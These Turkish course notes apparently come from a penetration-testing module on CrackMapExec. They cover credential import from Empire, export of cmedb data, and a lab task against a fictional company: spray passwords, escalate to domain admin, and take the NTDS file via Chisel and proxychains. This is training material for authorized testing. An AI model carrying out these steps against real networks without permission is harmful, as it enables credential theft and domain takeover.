### Empire Kimlik Bilgilerini İçe Aktarma
cmedb'nin sahip olduğu bir başka özellik de Empire'dan kimlik bilgilerini içe aktarma yeteneğidir.


### Import from Empire

![Pasted image 20241203155352.png](/img/user/resimler/Pasted%20image%2020241203155352.png)

Not: Bu özelliği kullanmak istiyorsanız Empire'ı yapılandırdığınızdan emin olun

### Export cmedb Data

CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları dışarı aktarabiliriz


### Kimlik Bilgilerini cmedb'den Dışa Aktarma

![Pasted image 20241203155453.png](/img/user/resimler/Pasted%20image%2020241203155453.png)

![Pasted image 20241203155458.png](/img/user/resimler/Pasted%20image%2020241203155458.png)

Veriler CSV dosyası olarak dışa aktarılır. LibreOffice veya Excel gibi araçları kullanarak açabiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)



### skill 

CrackMapExec aracı hakkında derinlemesine bir eğitim kursu aldıktan sonra ilk Dahili Sızma Testinizi gerçekleştiren bir Sızma Test Uzmanısınız. Müşteriniz INLANEFREIGHT CORP, Active Directory ortamını değerlendirmek için firmanızı işe aldı. İlk göreviniz geçerli bir hesap bulmak ve farklı protokoller kullanarak ortak bir parola denemek. Müşteriniz herhangi bir kesinti süresini göze alamaz, bu nedenle herhangi bir hesabı kilitlememeye dikkat etmeniz gerekir. Geçerli bir hesap bulduğunuzda, diğer hesapları ele geçirmenize yardımcı olacak ilginç bilgileri bulmak için numaralandırın, numaralandırın, numaralandırın. Unutmayın, amacınız alan yöneticisi erişimi elde edene kadar mümkün olduğunca çok hesabı ele geçirmektir. Amacınız hedef etki alanını ele geçirmek ve NTDS dosyasının içeriğini elde etmektir. Bu modülü dikkatle takip ettiyseniz, uzun sürmeyecektir.


### Hedef ortama bağlanma adımları

Uzaktan dahili bir sızma testi yapıyorsunuz, bu nedenle önce VPN'e bağlanmanız ve oradan 172.16.15.0/24 hedef ağına dahili numaralandırma yapmanız gerekecek. Dahili şirket ağına bağlanmak için aşağıdaki gibi Chisel ve proxyychains kullanmanız gerekecektir:


### Connecting to the Internal Network VPN

![Pasted image 20241203155738.png](/img/user/resimler/Pasted%20image%2020241203155738.png)
![Pasted image 20241203155743.png](/img/user/resimler/Pasted%20image%2020241203155743.png)

Chisel ile kullanmayı seçtiğiniz bağlantı noktasıyla eşleşmesi için /etc/proxychains.conf dosyasını değiştirmeyi unutmayın.

Hedef sistemi başlattığınızda, 10.129.204.182 örnek IP'sini hedef IP'nizle değiştirin.

Dahili ağı numaralandırmak için şu komutu kullanabilirsiniz: 
proxychains crackmapexec [protocol] [target] CME ile Proxychains bölümünde gösterildiği gibi.